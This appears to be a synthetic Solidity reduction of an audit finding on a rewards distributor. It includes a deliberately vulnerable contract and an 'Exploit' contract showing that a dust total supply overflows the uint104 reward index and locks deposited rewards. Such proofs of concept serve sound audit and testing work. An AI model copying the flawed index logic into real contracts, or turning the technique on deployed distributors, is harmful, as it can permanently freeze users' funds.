// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cod3x RewardsDistributor — dust totalSupply overflows the uint104 index (Spearbit, 49176)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: index = emission * dt * 10**decimals / totalBalance. A dust supply
    pushes the index past type(uint104).max, the require reverts, and the claim
    that follows never pays. */

contract MockERC20 {
    string public name = "Reward";
    string public symbol = "DAI";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RewardsDistributor {
    uint256 public constant EMISSION = 30_000_000_000_000; // 3e13 per second
    uint8 public constant DECIMALS = 18;
    uint256 public distributionEnd = 1;
    uint256 public lastUpdateTimestamp;
    uint256 public currentIndex;
    uint104 public rewardConfigIndex;
    uint256 public totalBalance;
    MockERC20 public reward;
    mapping(address => uint256) public userBalance;
    mapping(address => uint256) public userIndex;

    constructor(MockERC20 r, uint256 supply, uint256 userBal) {
        reward = r;
        totalBalance = supply;
        userBalance[msg.sender] = userBal;
    }

    function previewIndex() public view returns (uint256) {
        uint256 currentTimestamp = block.timestamp > distributionEnd ? distributionEnd : block.timestamp;
        uint256 timeDelta = currentTimestamp - lastUpdateTimestamp;
        return (EMISSION * timeDelta * (10 ** DECIMALS)) / totalBalance + currentIndex;
    }

    function updateIndex() public {
        uint256 newIndex = previewIndex();
        uint256 oldIndex = currentIndex;
        if (newIndex != oldIndex) {
            // @> VULN: dust totalBalance makes newIndex exceed uint104, so this require reverts and the claim never pays
            require(newIndex <= type(uint104).max, "Index overflow");
            rewardConfigIndex = uint104(newIndex);
            currentIndex = newIndex;
            lastUpdateTimestamp = uint32(block.timestamp);
        }
    }

    function claim(address user) external returns (uint256 owed) {
        updateIndex();
        owed = userBalance[user] * (currentIndex - userIndex[user]) / (10 ** DECIMALS);
        userIndex[user] = currentIndex;
        reward.transfer(user, owed);
    }
}

contract Exploit {
    uint256 public constant LOCKED = 1000 ether;
    uint256 public constant CONTROL_PAY = 30_000_000_000_000; // 3e13

    MockERC20 public reward; // nonce 1
    RewardsDistributor public dust; // nonce 2
    RewardsDistributor public healthy; // nonce 3

    uint256 public stuck;
    uint256 public dustIndex;
    bool public claimReverted;
    uint256 public controlPaid;

    constructor() {
        reward = new MockERC20();
        dust = new RewardsDistributor(reward, 1, 1);
        healthy = new RewardsDistributor(reward, 1 ether, 1 ether);
        reward.mint(address(this), LOCKED + CONTROL_PAY);
    }

    function run() external {
        dustIndex = dust.previewIndex();
        require(dustIndex > type(uint104).max, "dust index did not overflow");
        reward.transfer(address(dust), LOCKED);
        try dust.claim(address(this)) returns (uint256) {
            revert("dust claim paid");
        } catch {
            claimReverted = true;
        }
        stuck = reward.balanceOf(address(dust));
        require(claimReverted, "not reverted");
        require(stuck == LOCKED, "N not stuck");
        require(reward.balanceOf(address(this)) == CONTROL_PAY, "user was paid on dust");

        reward.transfer(address(healthy), CONTROL_PAY);
        controlPaid = healthy.claim(address(this));
        require(controlPaid == CONTROL_PAY, "control did not pay");
        require(reward.balanceOf(address(this)) == CONTROL_PAY, "control proceeds");
    }
}
